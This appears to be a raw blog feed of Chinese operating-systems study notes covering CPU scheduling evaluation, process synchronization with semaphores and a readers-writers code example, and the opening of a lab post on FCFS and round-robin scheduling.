还提供一个支持<strong>硬亲和性</strong>（ hard affinity） 的系统调用， 从而允许进程指定它不允许移至其他处理器上。</p><h4 id="5-4-3-负载平衡"><a href="#5-4-3-负载平衡" class="headerlink" title="5.4.3 负载平衡"></a>5.4.3 负载平衡</h4><h4 id="5-4-4-对称多线程"><a href="#5-4-4-对称多线程" class="headerlink" title="5.4.4 对称多线程"></a>5.4.4 对称多线程</h4><h3 id="5-5-线程调度"><a href="#5-5-线程调度" class="headerlink" title="5.5 线程调度"></a>5.5 线程调度</h3><h4 id="5-5-1-竞争范国"><a href="#5-5-1-竞争范国" class="headerlink" title="5.5.1 竞争范国"></a>5.5.1 竞争范国</h4><h4 id="5-5-2-Pthread调度"><a href="#5-5-2-Pthread调度" class="headerlink" title="5.5.2 Pthread调度"></a>5.5.2 Pthread调度</h4><h3 id="5-6-操作系统实例"><a href="#5-6-操作系统实例" class="headerlink" title="5.6 操作系统实例"></a>5.6 操作系统实例</h3><h4 id="5-6-1-实例：-Solaris调度"><a href="#5-6-1-实例：-Solaris调度" class="headerlink" title="5.6.1 实例： Solaris调度"></a>5.6.1 实例： Solaris调度</h4><h4 id="5-6-2-实例：-Windows-XP调度"><a href="#5-6-2-实例：-Windows-XP调度" class="headerlink" title="5.6.2 实例： Windows XP调度"></a>5.6.2 实例： Windows XP调度</h4><h4 id="5-6-3-实例：-Linux调度"><a href="#5-6-3-实例：-Linux调度" class="headerlink" title="5.6.3 实例： Linux调度"></a>5.6.3 实例： Linux调度</h4><h3 id="5-7-算法评估"><a href="#5-7-算法评估" class="headerlink" title="5.7 算法评估"></a>5.7 算法评估</h3><h4 id="5-7-1-确定模型"><a href="#5-7-1-确定模型" class="headerlink" title="5.7.1 确定模型"></a>5.7.1 确定模型</h4><p>一种类型的分析评估是确定模型法（ deterministic modeling）。这种方法采用特殊预先确定的负荷， 计算在给定负荷下每个算法的性能。</p><p>确定模型不但简单而且快速。它给出了数字， 以允许人们对算法进行比较。然而， 它要求输入为精确数字， 而且其答案只适用于这些情况。确定模型的主要用途在于描述调度算法和提供例子。</p><h4 id="5-7-2-排队模型"><a href="#5-7-2-排队模型" class="headerlink" title="5.7.2 排队模型"></a>5.7.2 排队模型</h4><p>知道了到达率和服务率， 可计算使用率、平均队列长度、平均等待时间等。这种研究称为排队网络分析（queueing-network analysis）。</p><p>作为一个例子， 设n为平均队列长度（不包括正在服务的进程）， w 为队列的平均等待时间，A为新进程到达队列的平均到达率（如每秒三个进程）。那么，在进程等待的W时间内， 则有λ ×w个新进程到达队列。如果系统处于稳定状态， 那么离开队列的进程的数量必须等于到达进程的数量。</p><p>因此，    <strong>n ＝ λ × W</strong><br>这一公式称为Little公式。Little 公式特别有用， 因为它适用于任何调度算法和到达分布。</p><h4 id="5-7-3-模拟"><a href="#5-7-3-模拟" class="headerlink" title="5.7.3 模拟"></a>5.7.3 模拟</h4><p>为了获得更为精确的调度算法评估， 可使用模拟（simulation）。模拟涉及对计算机系统进行建模。软件数据结构表示系统的主要组成部分。模拟程序有一个变量以表示时钟；当该变量的值增加时， 模拟程序会修改系统状态以反映设备、进程和调度程序的活动。随着模拟程序的执行， 用以表示算法性能的统计数字可以被收集并打印出来。</p><h4 id="5-7-4-实现"><a href="#5-7-4-实现" class="headerlink" title="5.7.4 实现"></a>5.7.4 实现</h4><p>针对评估调度算法， 唯一完全精确的方法是对它进行编程， 将它放在操作系统内， 并观测它如何工作。这一方法将真实算法放入操作系统，然后在真实操作系统内进行评估。</p><h3 id="5-8-小结"><a href="#5-8-小结" class="headerlink" title="5.8 小结"></a>5.8 小结</h3><p>CPU 调度的任务是从就绪队列中选择一个等待进程，并为其分配CPU。CPU由调度程序分配给所选中的进程。</p><p>先到先服务（FCFS）调度是最简单的调度算法，但是它会让短进程等待非常长的进程。</p><p>最短作业优先（ SJF ）调度可证明是最佳的，它提供了最短平均等待时间。实现SJF 调度比较困难，因为预测下一个CPU区间的长度有难度。SJF算法是通用优先级调度算法（将CPU 简单地分配给具有最高优先级的进程〉的特例。优先级和SJF调度会产生饥饿。老化技术可阻止饥饿。</p><p>轮转法（RR）调度对于分时（交互〉系统更为合适。RR调度让就绪队列的第一个进程使用CPU 的q个时间单元，这里q是时间片。在q时间单元之后，如果该进程还没有释放CPU，那么它被抢占并放到就绪队列的尾部。该算法的主要问题是选择时间片。如果时间片太大， 那么RR调度就成了FCFS调度；如果时间片太小， 那么因上下文切换而引起的调度开销就过大。</p><p>FCFS算法是非抢占的，而RR算法是抢占的。SJF和优先级算法可以是抢占的，也可以是非抢占的。</p><p>多级队列调度算法允许多个不同算法用于各种类型的进程。最为常用的模型包括使用眼调度的前台交互队列，以及使用FCFS 调度的后台批处理队列。多级反馈队列调度算法允许进程在队列之间迁移。</p><p>许多当前的计算机系统支持多处理器， 井允许每个处理器独立地调度它自己。通常，每个处理器维护自己的私有进程（或线程）队列， 它们都可以运行。与多处理器调度相关<br>的问题包括处理器亲和性和负载平衡。</p><p>如果操作系统在内核级支持线程， 那么必须调度线程而不是进程来执行。Solaris和Windows XP就是这样的系统， 它们采用抢占的、基于优先级的调度算法， 并支持实时线程。Linux进程调度也使用基于优先级算法， 并提供实时支持。这三种操作系统通常偏爱交互进程而不是批处理进程或CPU 约束进程。</p><p>因为有多种不同的调度算法可用， 所以需要某种方法来选择它们。分析方法使用数学分析以确定算法性能。模拟方法通过对代表性的进程采用调度算法模拟并计算其性能来确定优劣。不过， 模拟最多也只是提供对真实系统性能的近似， 评估调度算法唯一可靠的技术是在真实系统上的实现算法并在真实环境中进行性能跟踪。</p><h3 id="5-9-习题"><a href="#5-9-习题" class="headerlink" title="5.9 习题"></a>5.9 习题</h3><p><strong>5.1 为什么对调度来说，区分I/0 限制的程序和CPU 限制的程序是重要的？</strong></p><blockquote><p>I /0 限制的程序有在运行I /0 操作前只运行很少数量的计算机操作的性质。这种程序一般来说不会使用很多的CPU。 但是 CPU 限制的程序会利用整个的时间片，且不做任何阻碍I/0 操作的工作。</p><p>I/O约束程序通常具有很多短CPU区间。CPU约束程序可能有少量的长CPU区间。</p><p>因此，通过给I/0 限制的程序优先权和允许在CPU 限制的程序之前运行， 可以很好的利用计算机资源</p></blockquote><p><strong>5.10 解释下面调度算法对短进程偏好程度上的区别：</strong><br><strong>a. FCFS</strong><br><strong>b. RR</strong><br><strong>c. 多级反馈队列</strong></p><blockquote><p>a. FCFS一一区别短任务是因为任何在长任务之后到达的短任务部将会有很长的等待时间.<br>b. RR一一对所有的任务都是能够相同的（给它们相同的CPU 时间区间） ， 所以， 短任务可以很快的离开系统， 只要它们可以先完成．<br>c . 多级反馈队列和RR 调度算法相似一一它们不会先选择短任务。</p></blockquote><h2 id="第6章进程同步"><a href="#第6章进程同步" class="headerlink" title="第6章进程同步"></a>第6章进程同步</h2><h3 id="6-1-背景"><a href="#6-1-背景" class="headerlink" title="6.1 背景"></a>6.1 背景</h3><p>允许两个进程并发操作变量counter会得到不正确的状态。</p><p>多个进程并发访问和操作同一数据且执行结果与访问发生的特定顺序有关， 称为竞争条件（race condition）。为了避免竞争条件， 需要确保一段时间内只有一个进程能操作变量counter。为了实现这种保证， 要求进行一定形式的进程同步。</p><h3 id="6-2-临界区问题"><a href="#6-2-临界区问题" class="headerlink" title="6.2 临界区问题"></a>6.2 临界区问题</h3><p>每个进程有一个代码段称为<strong>临界区</strong>（critical section）， 在该区中进程可能改变共同变量、更新一个表、写一个文件等。</p><p>这种系统的<strong>重要特征</strong>是当一个进程进入临界区， 没有其他进程可被允许在临界区内执行， 即没有两个进程可同时在临界区内执行。</p><p><strong>临界区问题</strong>(critical-section problem ） 是设计一个以便进程协作的协议。每个进程必须请求允许进入其<strong>临界区</strong>。实现这一请求的代码段称为<strong>进入区</strong>（entry section）， 临界区之后可有<strong>退出区</strong>（exit section）， 其他代码为剩余区（remainder section）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161533895.png" alt="image-20211116161533895"></p><p>临界区问题的解答必须满足如下三项要求：</p><ul><li><strong>互斥</strong>（mutual exclusion）： 如果进程P； 在其临界区<br>内执行， 那么其他进程都不能在其临界区内执行。</li><li><strong>有空让进</strong>（progress）： 如果没有进程在其临界区内执行，且有进程需进入临界区，那么只有那些不在剩余区内执行<br>的进程可参加选择， 以确定谁能下一个进入临界区， 且这种选择不能无限推迟。</li><li><strong>有限等待</strong>(bounded waiting）：从一个进程做出进入临界区的请求， 直到该请求允许为止， 其他进程允许进入其临界区的次数有上限。</li></ul><h3 id="6-3-Peterson算法"><a href="#6-3-Peterson算法" class="headerlink" title="6.3 Peterson算法"></a>6.3 Peterson算法</h3><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161739706.png" alt="image-20211116161739706"></p><h3 id="6-3-0-面包师算法"><a href="#6-3-0-面包师算法" class="headerlink" title="6.3.0 面包师算法"></a>6.3.0 面包师算法</h3><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161850602.png" alt="image-20211116161850602"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161908057.png" alt="image-20211116161908057"></p><h3 id="6-4-硬件同步"><a href="#6-4-硬件同步" class="headerlink" title="6.4 硬件同步"></a>6.4 硬件同步</h3><p>TestAndSet()</p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162032902.png" alt="image-20211116162032902"><p>Swap()</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162152258.png" alt="image-20211116162152258"></p><p>上面两种算法未解决互斥</p><p>boolean waiting[n];<br>boolean lock;</p><p>这些数据结构均初始化false。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162305381.png" alt="image-20211116162305381"></p><ul><li><p>互斥</p><p>为了证明满足互斥要求，注意，只有waiting[i]==false 或key==flase 时， 进程P<del>i</del> 才进入临界区。只有当TestAndSet执行时， key的值才变成false。执行TestAndSet的第一个进程会发现key==false；所有其他进程必须等待。只有其他进程离开其临界区时，变量waiting[i］的值才能变成false：每次只有一个waiting[i］被设置为false,以满足互斥要求。</p></li><li><p>有空让进</p><p>任何一个已经进入CS的进程在“exit section” 时，设置：lock =false 或 waiting[ j ]= false，确保了至少可以让一个进程进入CS</p></li><li><p>有限等待条件</p><p>任何一个已经进入CS的进程Pi在“exit section” 时， 将会依次扫描waiting 数组（i+1,i+2,…n-1,0,…i-1)，并仅将Pi后面最先找到的进程j的waiting[ j]设置为false</p><p>这就使进程能依此循环进入CS</p></li></ul><p><strong>硬件指令实现的缺点</strong></p><ul><li>硬件指令虽然可以有效地保证进程间互斥，但有一个缺点，就是当进程正在临界段中执行时，其它想进入临界段的进程必须不断地测试布尔变量lock的值，这就造成了处理机机时的浪费，我们常称这种情况为“忙等待”</li><li>可能“饥饿”<strong>：</strong>如果从等待进程中随机选择一个进入临界区<strong>，</strong>有的进程可能一直选不上<strong>。</strong></li></ul><h3 id="6-5-信号量"><a href="#6-5-信号量" class="headerlink" title="6.5 信号量"></a>6.5 信号量</h3><p>信号量S是个整数变量，除了初始化外，它只能通过两个标准原子操作：wait()和signal()来访问。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162927219.png" alt="image-20211116162927219"></p><h4 id="6-5-1-用法"><a href="#6-5-1-用法" class="headerlink" title="6.5.1 用法"></a>6.5.1 用法</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116163758185.png" alt="image-20211116163758185"></p><h4 id="6-5-2-实现"><a href="#6-5-2-实现" class="headerlink" title="6.5.2 实现"></a>6.5.2 实现</h4><p>信号量的主要缺点是都要求<strong>忙等待</strong>（busy waiting）。当一个进程位于其临界区内时， 任何其他试图进入其临界区的进程都必须在其进入代码中连续地循环。这种类型的信号量也称<br>为<strong>自旋锁</strong>（spinlock）</p><p>为了克服忙等， 可以修改信号量操作wait()和signal()的定义。当一个进程执行wait()操作时， 发现信号量值不为正， 则它必须等待。然而， 该进程不是忙等而是阻塞自己。阻塞操作将一个进程放入到与信号量相关的等待队列中，井将该进程的状态切换成等待状态。接着， 控制转到CPU调度程序， 以选择另一个进程来执行。</p><p>一个被阻塞在等待信号量S上的进程，可以在其他进程执行signal()操作之后被重新执行。该进程的重新执行是通过wakeup()操作来进行的， 该操作将进程从等待状态切换到就<br>绪状态。接着， 该进程被放入到就绪队列中（根据CPU调度算法的不同，CPU有可能会、也可能不会从正在运行的进程切换到刚刚就绪的进程）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164332005.png" alt="image-20211116164332005"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164343388.png" alt="image-20211116164343388"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116165105798.png" alt="image-20211116165105798"></p><h4 id="6-5-3-死锁与饥饿"><a href="#6-5-3-死锁与饥饿" class="headerlink" title="6.5.3 死锁与饥饿"></a>6.5.3 死锁与饥饿</h4><p><strong>死锁</strong>：两个或多个进程无限地等待一个事件，而该事件只能由这些等待进程之一来产生。这里的事件是signal()操作的执行。当出现这样的状态时， 这些进程就称为死锁（deadlocked）。</p><p><strong>无限期阻塞</strong>(indefinite blocking）或<strong>饥饿</strong>（starvation）：即进程在信号量内无限期等待。如果对与信号量相关的链表按LIFO顺序来增加和移动进程，<br>那么可能会发生无限期阻塞。</p><h4 id="6-5-4-信号量小结"><a href="#6-5-4-信号量小结" class="headerlink" title="6.5.4 信号量小结"></a>6.5.4 信号量小结</h4><ol><li><p><strong>信号量的物理含义：</strong></p><p> <strong>S&gt;0：</strong>表示有S个资源可用</p><p> <strong>S=0：</strong>表示无资源可用</p><p> <strong>S&lt;0：</strong>则|S|表示S等待队列中的进程个数</p><p> <strong>P(S)：</strong>表示申请一个资源</p><p> <strong>V(S)：</strong>表示释放一个资源。</p></li><li><p><strong>P.V操作必须成对出现，有一个P操作就一定有一个V操作</strong></p><p> 当为<strong>互斥操作</strong>时，它们同处于同一进程</p><p> 当为<strong>同步操作</strong>时，则不在同一进程中出现</p><p> 如果P(S1)和P(S2)两个操作在一起，那么P操作的顺序至关重要,一个同步P操作与一个互斥P操作在一起时，同步P操作在互斥P操作前。</p><p> 而两个V操作无关紧要</p></li><li><p><strong>P.V操作的优缺点</strong></p><ul><li>优点：简单，而且表达能力强（用P.V操作可解决任何同步互斥问题）</li><li>缺点：不够安全；P.V操作使用不当会出现死锁；遇到复杂同步互斥问题时实现复杂</li></ul></li></ol><p> <strong>而两个V操作无关紧要</strong></p><h3 id="6-6-经典同步问题"><a href="#6-6-经典同步问题" class="headerlink" title="6.6 经典同步问题"></a>6.6 经典同步问题</h3><p>使用PV操作完成进程间的<strong>同步与互斥步骤</strong>：</p><ol><li>分析同步关系（制约关系）</li><li>设置信号量（一般情况下，有几项制约条件就应设置几个信号量）</li><li>选择并确定信号量的初值（初值和初始可用资源有关）</li><li>利用PV操作写出同步关系。</li></ol><h4 id="6-6-1-有限缓冲问题"><a href="#6-6-1-有限缓冲问题" class="headerlink" title="6.6.1 有限缓冲问题"></a>6.6.1 有限缓冲问题</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164843159.png" alt="image-20211116164843159"></p><p>下图会发生死锁，生产者一直等待</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116165556108.png" alt="image-20211116165556108"></p><h4 id="6-6-2-读者写者问题"><a href="#6-6-2-读者写者问题" class="headerlink" title="6.6.2 读者写者问题"></a>6.6.2 读者写者问题</h4><p><strong>制约条件分析：</strong></p><p>1、允许多个进程同时读文件（读－读允许）；<br>2、不允许在进程读文件时让另外一进程去写文件；有进程在写文件时不让另外一个进程去读该文件（“读-写”互斥）；<br>3、不允许多个写进程同时写同一文件（“写-写”互斥）。</p><h5 id="读者优先："><a href="#读者优先：" class="headerlink" title="读者优先："></a><strong>读者优先：</strong></h5><p>只要不断的有读者来读，那么readcount就一直会大于0，那么永远不会触发signal(wrt)条件，从而导致写者饥饿。</p><p>该问题被称为第一读者优先问题 </p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170507558.png" alt="image-20211116170507558"></p><h5 id="写者优先"><a href="#写者优先" class="headerlink" title="写者优先:"></a><strong>写者优先:</strong></h5><p>1.写者线程的优先级高于读者线程。<br>2.当写者到来时，只有那些已经获得授权的读进程才被允许完成它们的操作，写者之后到来的读者将被推迟，直到写者完成。<br>3.当没有写者进程时读者进程应该能够同时读取文件。</p><p><strong>具体实现:</strong><br>1.通过添加信号量<code>read</code>实现写者到来时能够阻止读者进程。<br>2.设置信号量<code>fileSrc</code>实现读写者对临界资源的访问。<br>3.设置计数器<code>writeCount</code>来统计当前阻塞的写者进程的数目，设置信号量<code>writeCountSignal</code>完成对<code>writeCount</code>计数器资源的互斥访问。<br>4.设置计数器<code>readCount</code>来统计访问临界资源的读者数目，设置信号量<code>readCountSignal</code>完成对<code>readCount</code>计数器资源的互斥访问。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170755343.png" alt="image-20211116170755343"></p><h5 id="读者写者公平竞争："><a href="#读者写者公平竞争：" class="headerlink" title="读者写者公平竞争："></a>读者写者公平竞争：</h5><ol><li>优先级相同。</li><li>写者、读者互斥访问。</li><li>只能有一个写者访问临界区。</li><li>可以有多个读者同时访问临界资源。</li></ol><p><strong>具体实现:</strong></p><ol><li>设置<code>file</code>信号量实现对临界资源的互斥访问。</li><li>设置计数器<code>readCount</code>实现多个读者访问临界资源，通过设置信号量<code>readCountSignal</code>实现对<code>readCount</code>计数器的互斥访问。</li><li>设置信号量<code>keySignal</code>实现读者和写者的公平竞争（令牌）。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 读者队列初始值为0，其他资源初始值为1*/</span><br><span class="hljs-keyword">int</span> readCount = <span class="hljs-number">0</span>;<br>semaphore keySignal = <span class="hljs-number">1</span>;<br>semaphore fileSrc = <span class="hljs-number">1</span>;<br>semaphore readCountSignal = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">reader</span>()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>      <span class="hljs-built_in">wait</span>(keySignal);        <span class="hljs-comment">//申请令牌</span><br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      <span class="hljs-keyword">if</span>(!readCount)          <span class="hljs-comment">//为零则申请文件资源</span><br>         <span class="hljs-built_in">wait</span>(fileSrc);<br>      readCount++;<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放计数器资源</span><br>      <span class="hljs-built_in">signal</span>(keySignal);      <span class="hljs-comment">//释放令牌</span><br> <br>      ...<br>      perform read operation  <span class="hljs-comment">//执行临界区代码</span><br>      ...<br>  <br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      readCount--;<br>      <span class="hljs-keyword">if</span>(!readCount)                <span class="hljs-comment">//为零则释放文件资源</span><br>         <span class="hljs-built_in">signal</span>(fileSrc);<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放读者计数器资源</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-built_in">writer</span>()<br>&#123;<br>     <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>     &#123;<br>        <span class="hljs-built_in">wait</span>(keySignal);     <span class="hljs-comment">//申请令牌</span><br>        <span class="hljs-built_in">wait</span>(fileSrc);       <span class="hljs-comment">//申请文件资源</span><br> <br>        ...<br>        perform write operation <span class="hljs-comment">//执行临界区代码</span><br>        ...<br> <br>        <span class="hljs-built_in">signal</span>(fileSrc);   <span class="hljs-comment">//释放文件资源</span><br>        <span class="hljs-built_in">signal</span>(keysignal); <span class="hljs-comment">//释放令牌</span><br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-6-3-哲学家进餐回题"><a href="#6-6-3-哲学家进餐回题" class="headerlink" title="6.6.3 哲学家进餐回题"></a>6.6.3 哲学家进餐回题</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170946819.png" alt="image-20211116170946819"></p><p><strong>死锁解决方法：</strong></p><ul><li>至多只允许四位哲学家同时去拿左边的筷子；</li><li>仅当哲学家左右两边的筷子均可用时才允许他拿起筷子；</li><li>规定奇数号哲学家先拿起他左边的筷子，而偶数号哲学家先拿起他右边的筷子。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116171117548.png" alt="image-20211116171117548"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116171127875.png" alt="image-20211116171127875"></p><h3 id="6-7-管程"><a href="#6-7-管程" class="headerlink" title="6.7 管程"></a>6.7 管程</h3><h4 id="6-7-1-使用"><a href="#6-7-1-使用" class="headerlink" title="6.7.1 使用"></a>6.7.1 使用</h4><h4 id="6-7-2-哲学家进餐问题的管程解决方案"><a href="#6-7-2-哲学家进餐问题的管程解决方案" class="headerlink" title="6.7.2 哲学家进餐问题的管程解决方案"></a>6.7.2 哲学家进餐问题的管程解决方案</h4><h4 id="6-7-3-基于信号量的管程实现"><a href="#6-7-3-基于信号量的管程实现" class="headerlink" title="6.7.3 基于信号量的管程实现"></a>6.7.3 基于信号量的管程实现</h4><h4 id="6-7-4-管程内的进程重启"><a href="#6-7-4-管程内的进程重启" class="headerlink" title="6.7.4 管程内的进程重启"></a>6.7.4 管程内的进程重启</h4><h3 id="6-8-同步实例"><a href="#6-8-同步实例" class="headerlink" title="6.8 同步实例"></a>6.8 同步实例</h3><h4 id="6-8-1-Solaris同步"><a href="#6-8-1-Solaris同步" class="headerlink" title="6.8.1 Solaris同步"></a>6.8.1 Solaris同步</h4><h4 id="6-8-2-Windows-XP同步"><a href="#6-8-2-Windows-XP同步" class="headerlink" title="6.8.2 Windows XP同步"></a>6.8.2 Windows XP同步</h4><h4 id="6-8-3-Linux同步"><a href="#6-8-3-Linux同步" class="headerlink" title="6.8.3 Linux同步"></a>6.8.3 Linux同步</h4><h4 id="6-8-4-Pthread同步"><a href="#6-8-4-Pthread同步" class="headerlink" title="6.8.4 Pthread同步"></a>6.8.4 Pthread同步</h4><h3 id="6-9-原子事务"><a href="#6-9-原子事务" class="headerlink" title="6.9 原子事务"></a>6.9 原子事务</h3><h4 id="6-9-1-系统模型"><a href="#6-9-1-系统模型" class="headerlink" title="6.9.1 系统模型"></a>6.9.1 系统模型</h4><h4 id="6-9-2-基于日志的恢复"><a href="#6-9-2-基于日志的恢复" class="headerlink" title="6.9.2 基于日志的恢复"></a>6.9.2 基于日志的恢复</h4><h4 id="6-9-3-检查点"><a href="#6-9-3-检查点" class="headerlink" title="6.9.3 检查点"></a>6.9.3 检查点</h4><h4 id="6-9-4-并发原子操作"><a href="#6-9-4-并发原子操作" class="headerlink" title="6.9.4 并发原子操作"></a>6.9.4 并发原子操作</h4><h3 id="6-10-小结"><a href="#6-10-小结" class="headerlink" title="6.10 小结"></a>6.10 小结</h3><h3 id="6-11-习题"><a href="#6-11-习题" class="headerlink" title="6.11 习题"></a>6.11 习题</h3><p><strong>试分析说明为何自旋锁（spinlocks）不适合单处理器系统但却常用于多处理器系统</strong></p><blockquote><p>解答：<br>自旋锁（进程在其等待锁时还在运行）的缺点是忙等待，当一个进程位于其临界区内时，任何其它试图进入其临界区的进程都必须在其进入代码中连续地循环。在单处理器系统中，忙等待浪费了CPU时钟（这些时钟本来可以有效地为其他进程所使用）。<br>自旋锁的优点就是，进程在等待锁时不会进行上下文切换，而上下文切换可能需要花费相当长的时间。因此，如果锁的占用时间短，自旋锁就可以变得非常有用。它常常用于多处理器系统中，这样一个线程在一个处理器自旋时，另一线程可在另一处理器上在其临界区内执行。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验四-调度算法</title>
    <link href="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/"/>
    <url>/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h1><h2 id="一、实验内容"><a href="#一、实验内容" class="headerlink" title="一、实验内容"></a>一、实验内容</h2><ul><li> 实现先来先服务调度算法（SPF）</li><li>实现时间片轮转调度算法（RR）</li></ul><h2 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h2><ul><li>通过对进程调度算法的设计，深入理解进程调度的原理。</li><li>进程是程序在一个数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位。</li><li>进程调度分配处理机，是控制协调进程对CPU的竞争，即按一定的调度算法从就绪队列中选<br>中一个进程，把CPU的使用权交给被选中的进程。</li></ul><h2 id="三、实验题目"><a href="#三、实验题目" class="headerlink" title="三、实验题目"></a>三、实验题目</h2><ol><li>先来先服务（FCFS）调度算法</li></ol><ul><li>原理：每次调度是从就绪队列中，选择一个最先进入就绪队列的进程，把处理器分配给该进程，使之得到执行。该进程一旦占有了处理器，它就一直运行下去，直到该进程完成或因发生事件而阻塞，才退出处理器。</li><li>将用户作业和就绪进程按提交顺序或变为就绪状态的先后排成队列，并按照先来先服务的方式进行调度处理，是一种最普遍和最简单的方法。它优先考虑在系统中等待时间最长的作业，而不管要求运行时间的长短。</li><li>按照就绪进程进入就绪队列的先后次序进行调度，简单易实现，利于长进程，CPU繁忙型作业，不利于短进程，排队时间相对过长</li></ul><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112131036353.png" alt="image-20211112131036353"></p><ol start="2"><li>时间片轮转调度算法RR</li></ol><ul><li>原理：时间片轮转法主要用于进程调度。采用此算法的系统，其程序就绪队列往往按进程到达的时间来排序。进程调度按一定时间片(q)轮番运行各个进程.</li><li>进程按到达时间在就绪队列中排队，调度程序每次把CPU分配给就绪队列首进程使用一个时间片，运行完一个时间片释放CPU，排到就绪队列末尾参加下一轮调度，CPU分配给就绪队列的首进程。</li><li>固定时间片轮转法：<br>1 所有就绪进程按 FCFS 规则排队。<br>2 处理机总是分配给就绪队列的队首进程。<br>3 如果运行的进程用完时间片，则系统就把该<br>进程送回就绪队列的队尾，重新排队。<br>4 因等待某事件而阻塞的进程送到阻塞队列。<br>5 系统把被唤醒的进程送到就绪队列的队尾</li></ul><p><img 